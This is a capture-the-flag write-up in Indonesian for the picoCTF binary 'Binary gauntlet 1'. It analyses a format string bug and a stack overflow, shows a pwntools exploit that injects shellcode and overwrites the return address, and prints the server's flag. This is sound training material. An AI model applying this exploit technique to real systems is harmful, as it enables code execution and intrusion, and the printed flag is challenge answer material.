# Binary gauntlet 1

## summary
chall binary exploitation dari picoctf yang memiliki berbagai macam kerentanan, tidak ada flag jadi target utama adalah mendapatkan shell dan melakukan print flag di server.

## vulnerable
- semua proteksi mati
- format string
- buffer overflow


## analysis
fastcheck metadata dan proteksi 
```
file gauntlet1 ; pwn checksec gauntlet1
```
```
gauntlet1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=1bd5a85a96652e67ca5d7838042dd32cf535ebf4, for GNU/Linux 3.2.0, not stripped
[*] '/home/rotalactf/reno/pwn/picoctf/binary-gauntlet-1/gauntlet1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```
file binary x86-64 dengan semua proteksi mati. 

run binary :
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(binary-gauntlet-1)
└> ./gauntlet1
0x7ffe434919b0
s
s
s
┌[rotalactf]-[LAPTOP-6QMID52F]-(binary-gauntlet-1)
└> ./gauntlet1
0x7fff9b5d59f0
%p
0xa70
%p
```

program ini meminta input dan memiliki kerentanan format string. selain itu program ini mencetak suatu alamat sebelum meminta input. dari pola depannya (0x7ff) terlihat seperti
alamat stack. 
untuk melihat apa yang sebenarnya dilakukan oleh program ini aku mendecompilenya dengan ghidra.


namun program ini tidak memiliki fungsi menarik jadi aku langsung menganalisis fungsi main():

```C

undefined8 main(void)

{
  char local_78 [104];
  char *local_10;
  
  local_10 = malloc(1000);
  printf("%p\n",local_78);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  printf(local_10);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  strcpy(local_78,local_10);
  return 0;
}

```
ternyata alamat memory yang di cetak adalah milik `local_78` , ternyata benar bahwa itu alamat stack. `(char local_78 [104];)`  

ada kerentanan format string pada input pertama yang hasilnya dicetak ulang dengan `printf(local_10);` tanpa format string.

terakhir, terlihat dengan jelas terdapat kerentanan buffer overflow disini, program mencoba menyalin sesuatu dari heap yang berukuran 999 (ukuran pointer local_10) ke dalam variabel lokal
yang hanya berukuran 104 byte (local_78)

program ini tidak ada print flag atau apapun, menurut data yang sudah dimiliki :

- proteksi nx mati (stack executable)
- kerentanan buffer overflow
- leak alamat stack

rencananya sederhana :
- menghitung jarak input ke return address di stack
- mengisi stack dengan shellcode + padding
- menimpa return address ke stack sehingga program mengeksekusi stack berisi shellcode
- mendapat shell dan mengambil flag di server

## exploit

first ambil dulu leak address di binary 
```Python
p = process()

leak = p.recvline().strip().decode()
# print(leak)
stack_addr = int(leak,16)
```
alamat stack sudah di amankan.


untuk shellcode tidak perlu repot repot, aku gunakan dari pwntools yaitu `asm(shellcraft.sh())` , fungsi itu akan membuat shellcode secara otomatis menyesuaikan elf.
untuk menggunakan ini pastikan sudah set context.binary ke program yang akan dijalankan : `context.binary = ELF("./gauntlet1")`


**NOTE : INPUT kita disimpan di heap, dan program hanya melakukan copy isi heap ke stack bukan pergi dari stack**

jadi aku harus menghitung jarak return address dari awal stack.  
ukuran stack : `char local_78 [104];`  tepat di bawahnya ada pointer heap, `char *local_10;`, ukuran pointer ini adalah 8 byte, 
setelah itu tentu ada `saved rbp` yang ukurannya 8 byte juga, baru `return address`


```
jarak = 104 + 8 + 8
jarak = 120
```
maka jarak untuk mencapai return address adalah `120 byte` dikurangi panjang shellcode 

maka susunan payload adalah
```python
shell = asm(shellcraft.sh())
jarak = 120
padd = b'a'*(jarak-len(shell))

pay = flat(
    shell,
    padd,
    stack_addr
)

```

berikut [full script nya](solver.py)

```
└> python3 solver.py
OKE
$ ls
gauntlet1  solver.py
$
```
berhasil dapat shell, tinggal ganti target jadi server dan mengambil flag

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(binary-gauntlet-1)
└> python3 solver.py
OKE
$ ls
Dockerfile
Makefile
flag.txt
gauntlet
gauntlet.c
start.sh
$ cat flag.txt
b261063d3fe1626683d7207950935469
$
```
done 

flag : **b261063d3fe1626683d7207950935469**
